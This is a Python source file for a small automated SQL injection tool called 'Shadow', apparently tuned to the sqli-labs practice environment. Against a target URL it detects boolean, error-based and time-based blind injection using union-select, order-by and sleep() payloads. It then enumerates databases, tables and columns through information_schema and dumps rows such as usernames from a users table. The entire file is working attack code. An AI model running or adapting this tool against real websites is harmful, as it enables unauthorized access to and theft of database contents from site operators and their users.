import argparse
import os
import re,optparse,urllib,random,http.client,time,Time_blind,Boolean_blind
import requests
from urllib import request
from urllib.parse import quote
from bs4 import BeautifulSoup

NAME, VERSION, AUTHOR, LICENSE = "Shadow ", "0.2b", "Piestar", "Public domain (FREE)"

RANDINT1 = random.randint(1, 100)
RANDINT2 = random.randint(101,200)
BOOLEAN_TESTS1 = quote(" AND %d=%d" %(RANDINT1,RANDINT1),'utf-8')
BOOLEAN_TESTS2 = quote(" AND %d=%d" %(RANDINT1,RANDINT2),'utf-8')

HTTPCODE, HTML = range(2)
RANDINT = random.randint(1, 255)
TIMEOUT = 30
DBMS_ERRORS = {                                                                     # 用于基于错误消息响应的DBMS识别的正则表达式
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
    "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
    "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
    "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
}

BOOLEAN_TESTS_LIST = []
BOOLEAN_TESTS_LIST.append(BOOLEAN_TESTS1)
BOOLEAN_TESTS_LIST.append(BOOLEAN_TESTS2)

TAMPER_SQL_CHAR_POOL = ['%22', '%27', '%27%29',"%22%29",'%20']

def log(content):
    this_time = time.strftime('%H:%M:%S', time.localtime(time.time()))
    print('[' + str(this_time) + '] ' + content)

def send_request(url):
    log(url)
    res = request.urlopen(url)
    result = str(res.read().decode('utf-8'))
    return result

def get_prefix_url(url):
    splits = url.split('=')
    splits.remove(splits[-1])
    prefix_url = ''
    for item in splits:
        prefix_url += str(item)
    return prefix_url

def judeg_boolean_injection(url):#判断是否存在布尔注入

    for item in TAMPER_SQL_CHAR_POOL:
        target_url1 = url + str(item) + '%20' + BOOLEAN_TESTS1+'%23'
        target_url2 = url + str(item) + '%20' + BOOLEAN_TESTS2+'%23'

        result1 = send_request(target_url1)
        result2 = send_request(target_url2)

        soup1 = BeautifulSoup(result1, 'html.parser')
        fonts1 = soup1.find_all('font')
        content1 = str(fonts1[2].text)

        soup2 = BeautifulSoup(result2, 'html.parser')
        fonts2 = soup2.find_all('font')
        content2 = str(fonts2[2].text)

        if content1.find('Login') != -1 and content2 == None or content2.strip() == '':
            log('Use ' + item + ' -> Exist Boolean SQL Injection')
            return item, True
        else:
            log('Use ' + item + ' -> Not Exist Boolean SQL Injection')
    return None, False

def netcheck(url):#用来检测网络联通性
    try:
        r = requests.get(url, timeout = 16)
        status_code = r.status_code
        return status_code
    except Exception as e:
        return e

def judeg_dbms(url): #用来判断数据库
    for item in TAMPER_SQL_CHAR_POOL:
        result = send_request(url+item+'aaaaa')
        for (dbms, regex) in ((dbms, regex) for dbms in DBMS_ERRORS for regex in DBMS_ERRORS[dbms]):
            if re.search(regex, result, re.I):
                log("Use " + item + " -> Exist Error SQL Injection and Target DBMS IS "+ dbms)
                return item,dbms,True
            else:
                pass
    log("该页面不存在报错注入")
    return None,None,False



def judeg_time_inject(url):
    for item in TAMPER_SQL_CHAR_POOL:
        test_url = url+item+"and%20if(1=1,sleep(5),null)--+"
        time = requests.get(test_url).elapsed.total_seconds()
        if time > 4.5:
            log("Use "+item+" -> Exist Time SQL Injection")
            return item,True
    else:
        log("该页面不存在时间盲注")
        return None,False

class Boolean_inject():

    def function1(url,symbol,flag,index,function):
        prefix_url = get_prefix_url(url)
        test_url = prefix_url + '=0' + symbol + '%20union%20select%20'

        for i in range(1, flag):
            if i == index:
                test_url += function + ','
            elif i == flag - 1:
                test_url += str(i) + '%20--+'
            else:
                test_url += str(i) + ','
        return (test_url)

    def boolean_inject_all_database(url, symbol, flag, index, temp_list):
        list=[]
        data = ''
        payload = '(select%20concat(SCHEMA_NAME)%20from%20information_schema.SCHEMATA%20limit%20{0},1)'
        for j in range(30):  # 假设最多10个数据库
            function = payload.format(j)
            test_url = Boolean_inject.function1(url, symbol, flag, index, function)
            result = send_request(test_url)
            soup = BeautifulSoup(result, 'html.parser')
            fonts = soup.find_all('font')
            content = str(fonts[2].text)
            if content.split(temp_list[0])[1].split(temp_list[1])[0]=='':
                pass
            else:
                list.append(content.split(temp_list[0])[1].split(temp_list[1])[0])
        for i in list:
            data = data +'   '+i
        return data


    def test_order_by(url, symbol):
        flag = 0
        for i in range(1, 100):
            log('Order By Test -> ' + str(i))
            test_url = url + symbol + '%20order%20by%20' + str(i) + '--+'
            result = send_request(test_url)
            soup = BeautifulSoup(result, 'html.parser')
            fonts = soup.find_all('font')
            content = str(fonts[2].text)
            if content.find('Login') == -1:
                if str(fonts[1].text).find('You are in...........'):
                    if i >1:
                        return i
                    else:
                        log('该页面没有回显位置')
                        break
                log('Order By Test Success -> order by ' + str(i))
                flag = i
                break
        return flag


    def test_union_select(url, symbol, flag):
        prefix_url = get_prefix_url(url)
        test_url = prefix_url + '=0' + symbol + '%20union%20select%20'
        print(test_url)
        for i in range(1, flag):  # 这里是判断回显正确的时候
            if i == flag - 1:
                test_url += str(i) + '%20--+'
            else:
                test_url += str(i) + ','
        result = send_request(test_url)
        soup = BeautifulSoup(result, 'html.parser')
        fonts = soup.find_all('font')
        content = str(fonts[2].text)
        for i in range(1, flag):  # 在font的标签中找到flag，返回他的位置
            if content.find(str(i)) != -1:
                temp_list = content.split(str(i))
                return i, temp_list



    def exec_function(url, symbol, flag, index, temp_list, function):
        prefix_url = get_prefix_url(url)
        test_url = prefix_url + '=0' + symbol + '%20union%20select%20'

        for i in range(1, flag):
            if i == index:
                test_url += function + ','
            elif i == flag - 1:
                test_url += str(i) + '%20--+'
            else:
                test_url += str(i) + ','
        result = send_request(test_url)
        soup = BeautifulSoup(result, 'html.parser')
        fonts = soup.find_all('font')
        content = str(fonts[2].text)
        return content.split(temp_list[0])[1].split(temp_list[1])[0]

    def get_tables(url, symbol, flag, index, temp_list,database):
        prefix_url = get_prefix_url(url)
        test_url = prefix_url + '=0' + symbol + '%20union%20select%20'

        for i in range(1, flag):
            if i == index:
                test_url += 'group_concat(table_name)' + ','
            elif i == flag - 1:
                test_url += str(i) + "%20from%20information_schema.tables%20where%20table_schema='"+database+"'%20--+"
            else:
                test_url += str(i) + ','
        result = send_request(test_url)
        soup = BeautifulSoup(result, 'html.parser')
        fonts = soup.find_all('font')
        content = str(fonts[2].text)
        last = content.split(temp_list[0])[1].split(temp_list[1])[0]
        if last == '':
            exit("没有该数据库")
        return last

    def get_columns(url, symbol, flag, index, temp_list,database,table):
        prefix_url = get_prefix_url(url)
        test_url = prefix_url + '=0' + symbol + '%20union%20select%20'

        for i in range(1, flag):
            if i == index:
                test_url += 'group_concat(column_name)' + ','
            elif i == flag - 1:
                test_url += str(i) + "%20from%20information_schema.columns%20where%20table_name='"+table+"'%20and%20table_schema='"+database+"'%20--+"
            else:
                test_url += str(i) + ','
        result = send_request(test_url)
        soup = BeautifulSoup(result, 'html.parser')
        fonts = soup.find_all('font')
        content = str(fonts[2].text)
        last = content.split(temp_list[0])[1].split(temp_list[1])[0]
        if last == '':
            exit('指定表错误')
        return last

    def get_data(url, symbol, flag, index, temp_list,table,field):
        prefix_url = get_prefix_url(url)
        test_url = prefix_url + '=0' + symbol + '%20union%20select%20'

        for i in range(1, flag):
            if i == index:
                test_url += 'group_concat(id,0x3a,'+field+')' + ','
            elif i == flag - 1:
                test_url += str(i) + "%20from%20"+table+"%20--+"
            else:
                test_url += str(i) + ','
        result = send_request(test_url)
        soup = BeautifulSoup(result, 'html.parser')
        fonts = soup.find_all('font')
        content = str(fonts[2].text)
        #print(content)
        return content.split(temp_list[0])[1].split(temp_list[1])[0].split(',')

def do_sql_inject(url):

    boolean_symbol, boolean_result = judeg_boolean_injection(url)
    error_symbol, ss,error_result = judeg_dbms(url)
    time_symbol, time_result = judeg_time_inject(url)
    boolean_blind_data = ''
    boolean_data = ''
    error_data = ''
    time_blind_data = ''

    if boolean_result == True:
        flag = Boolean_inject.test_order_by(url, boolean_symbol)
        if flag == 0:
            select = input("执行布尔盲注 YES OR NO :").lower()
            if select == 'yes' or select == '':
                database = Boolean_blind.blind_inject_database(url,boolean_symbol)
                log('Database ->' + database.strip())
                table = Boolean_blind.blind_table_data(url,boolean_symbol,args.database)
                log('Tables -> ' + table.replace('||','    '))
                log('Default Use Table users......')
                columns = Boolean_blind.blind_table_field(url,boolean_symbol,args.database,args.table)
                log('Columns -> ' + columns.replace('||','    '))
                log('Try To Get Data......\n\n')
                if args.database != database.strip():
                    print("该页面没有连接其他数据库所以不能获取其他数据库信息")
                else:
                    boolean_blind_data = Boolean_blind.blind_data(url,boolean_symbol,args.table,args.column,data_count=args.count,dir_file=args.file)
                    print('\n\n',boolean_blind_data)

            else:
                print("不执行布尔盲注")
        else:
            index, temp_list = Boolean_inject.test_union_select(url, boolean_symbol, flag)
            all_database = Boolean_inject.boolean_inject_all_database(url,boolean_symbol,flag,index,temp_list)
            print('all_database ->',all_database)
            database = judeg_dbms(url)[1]
            version = Boolean_inject.exec_function(url, boolean_symbol, flag, index, temp_list, 'version()')
            this_database = Boolean_inject.exec_function(url, boolean_symbol, flag, index, temp_list, 'database()')
            log('Success -> ' + database.strip() + ' ' + version.strip())
            log('Current Database -> ' + this_database.strip())
            tables = Boolean_inject.get_tables(url, boolean_symbol, flag, index, temp_list,args.database)
            log('Tables -> ' + tables.strip())
            log('Default Use Table users......')
            columns = Boolean_inject.get_columns(url, boolean_symbol, flag, index, temp_list,args.database,args.table)
            log('Columns -> ' + columns.strip())
            log('Try To Get Data......\n\n')
            if args.database != this_database.strip():
                print("该页面没有连接其他数据库所以不能获取其他数据库信息")
            else:
                datas = Boolean_inject.get_data(url, boolean_symbol, flag, index, temp_list, args.table, args.column)
                temp = columns.split(',')
                # print(datas)
                print('%-12s%-12s' % (temp[0], temp[1]))
                for data in datas:
                    temp = data.split(':')
                    boolean_data = boolean_data + '\n' + '%-12s%-12s' % (temp[0], temp[1])
                print(boolean_data)
    else:
        print("不存在布尔注入执行报错注入或者时间盲注")

    if error_result == True:
        select = input("是否执行报错注入 YES OR NO :").lower()
        if select == 'yes' or select == '':
            database = Boolean_blind.error_inject_databse(url,error_symbol)
            log('Database -> ' + database.strip())
            tables = Boolean_blind.error_database_table(url,error_symbol,args.database)
            log('Tables -> ' + tables.strip())
            columns = Boolean_blind.error_tables_field(url, error_symbol,args.database,args.table)
            log('Columns -> ' + columns.strip())
            if args.database != database.strip():
                print("该页面没有连接其他数据库所以不能获取其他数据库信息")
            else:
                error_data = Boolean_blind.error_get_data(url,error_symbol,args.database,args.table,args.column,args.count)
                print('\n\n', error_data)
        else:
            print("不执行报错注入")
    else:
        print("不存在报错注入")


    if time_result == True:
        select = input("是否执行时间注入 YES OR NO :").lower()
        if select == 'yes' or select == '':
            database = Time_blind.Time_blind.time_inject_database_name(url,time_symbol)
            log('Database -> ' + database.strip())
            table_count= Time_blind.Time_blind.time_inject_table_count(url,time_symbol,args.database)
            table_all_length = Time_blind.Time_blind.time_inject_table_length_2(url,time_symbol,table_count,args.database)
            tables = Time_blind.Time_blind.time_inject_table_data_3(url,time_symbol,table_count,table_all_length,args.database)
            log('Tables -> ' + tables.strip())
            table_field_length =Time_blind.Time_blind.time_inject_table_field_length_2(url,time_symbol,args.database,args.table)
            columns = Time_blind.Time_blind.time_inject_table_field_data_3(url,time_symbol,table_field_length,args.database,args.table)
            log('Columns -> ' + columns.strip())
            if args.database != database.strip():
                print("该页面没有连接其他数据库所以不能获取其他数据库信息")
            else:
                time_blind_data = Time_blind.time_get_data(url,time_symbol,args.table,args.column,dir_file=args.file)
                print('\n\n', time_blind_data)
        else:
            print("不执行时间盲注")
    else:
        print("不存在时间盲注")


def do_sql_inject1(url):

    boolean_symbol, boolean_result = judeg_boolean_injection(url)
    error_symbol, ss,error_result = judeg_dbms(url)
    time_symbol, time_result = judeg_time_inject(url)
    boolean_blind_data = ''
    boolean_data = ''
    error_data = ''
    time_blind_data = ''

    if boolean_result == True:
        flag = Boolean_inject.test_order_by(url, boolean_symbol)
        if flag == 0:
            select = input("执行布尔盲注 YES OR NO :").lower()
            if select == 'yes' or select == '':

                if args.D:
                    database = Boolean_blind.blind_inject_database(url, boolean_symbol)
                    print('database ->', database)

                if args.T:
                    table = Boolean_blind.blind_table_data(url, boolean_symbol, args.database)
                    log('Tables -> ' + table.replace('||','    '))
                    log('Default Use Table users......')

                if args.C:
                    columns = Boolean_blind.blind_table_field(url, boolean_symbol, args.database, args.table)
                    log('Columns -> ' + columns.replace('||','    '))
            else:
                print("不执行布尔盲注")
        else:
            index, temp_list = Boolean_inject.test_union_select(url, boolean_symbol, flag)
            if args.D:
                all_database = Boolean_inject.boolean_inject_all_database(url, boolean_symbol, flag, index, temp_list)
                print('database ->',all_database)
                database = judeg_dbms(url)[1]
                version = Boolean_inject.exec_function(url, boolean_symbol, flag, index, temp_list, 'version()')
                this_database = Boolean_inject.exec_function(url, boolean_symbol, flag, index, temp_list, 'database()')
                log('Success -> ' + database.strip() + ' ' + version.strip())
                log('Current Database -> ' + this_database.strip())

            if  args.T:
                tables = Boolean_inject.get_tables(url, boolean_symbol, flag, index, temp_list, database=args.database)
                log('Tables -> ' + tables.strip())
                log('Default Use Table users......')

            if args.C:
                columns = Boolean_inject.get_columns(url, boolean_symbol, flag, index, temp_list,database=args.database,table=args.table)
                log('Columns -> ' + columns.strip())
    else:
        print("不存在布尔注入执行报错注入或者时间盲注")

    if error_result == True:
        select = input("是否执行报错注入 YES OR NO :").lower()
        if select == 'yes' or select == '':

            if args.D:
                all_database = Boolean_blind.error_inject_all_database(url,error_symbol)
                log('All Database -> ' + all_database.strip())
                database = Boolean_blind.error_inject_databse(url, error_symbol)
                log('Database -> ' + database.strip())


            if args.T:
                tables = Boolean_blind.error_database_table(url, error_symbol, args.database)
                log('Tables -> ' + tables.strip())
            if args.C:
                columns = Boolean_blind.error_tables_field(url, error_symbol,args.database,args.table)
                log('Columns -> ' + columns.strip())
        else:
            print("不执行报错注入")
    else:
        print("不存在报错注入")


    if time_result == True:
        select = input("是否执行时间注入 YES OR NO :").lower()
        if select == 'yes' or select == '':

            if args.D:
                database = Time_blind.Time_blind.time_inject_database_name(url, time_symbol)
                log('Database -> ' + database.strip())

            if args.T:
                table_count = Time_blind.Time_blind.time_inject_table_count(url, time_symbol, args.database)
                table_all_length = Time_blind.Time_blind.time_inject_table_length_2(url, time_symbol, table_count,args.database)
                tables = Time_blind.Time_blind.time_inject_table_data_3(url, time_symbol, table_count, table_all_length,args.database)
                log('Tables -> ' + tables.strip())
            if args.C:
                table_field_length = Time_blind.Time_blind.time_inject_table_field_length_2(url, time_symbol, args.database, args.table)
                columns = Time_blind.Time_blind.time_inject_table_field_data_3(url, time_symbol,table_field_length,args.database,args.table)
                log('Columns -> ' + columns.strip())
        else:
            print("不执行时间盲注")
    else:
        print("不存在时间盲注")





if __name__ == '__main__':

    parser = argparse.ArgumentParser(description="Small SQL injection tool")
    parser.add_argument('--verbose', '-v', action='store_true', help='verbose mode')  # 获取工具的版本号
    parser.add_argument('--data', action='store_true', help=('Automated SQL injection to get data'))  # 获取目标网站数据库的内容
    parser.add_argument('-D', action='store_true', help=('DBMS database to enumerate'))  # 获取目标网站数据库的名称
    parser.add_argument('-T', action='store_true',
                        help=('DBMS database table(s) to enumerate'))  # 获取目标网站数据库的表
    parser.add_argument('-C', action='store_true',
                        help=('DBMS database table column(s) to enumerate'))  # 获取目标网站数据库的列
    parser.add_argument("-u", "--url", required=True, type=str,
                        help=('Target URL (e.g. "http://www.target.com/page.php?id=1")'))  # 获取要测试的网站URL
    parser.add_argument('--database', nargs='?', default='security',help=('Specify the database, the default is security'))
    parser.add_argument('--table', nargs='?', default='users',help=('Specify the table, the default is users'))
    parser.add_argument('--column', nargs='?', default='username',help=('Specify the column, the default is username'))
    parser.add_argument('--file', nargs='?', default='sub_full.txt', help=('Data directory dictionary '))
    parser.add_argument('--count', nargs='?', default=20, help=('Default total number of data '))
    args = parser.parse_args()  # 将变量以标签-值的字典形式存入args字典

    if os.path.exists(args.file) == False:
        exit('Data directory dictionary does not exist')

    if netcheck(args.url) != 200:
        exit("host " + args.url + " does not exist")
    else:
        url = args.url

        if args.data:
            do_sql_inject(url)

        if args.D or args.T or args.C:
            do_sql_inject1(url)






















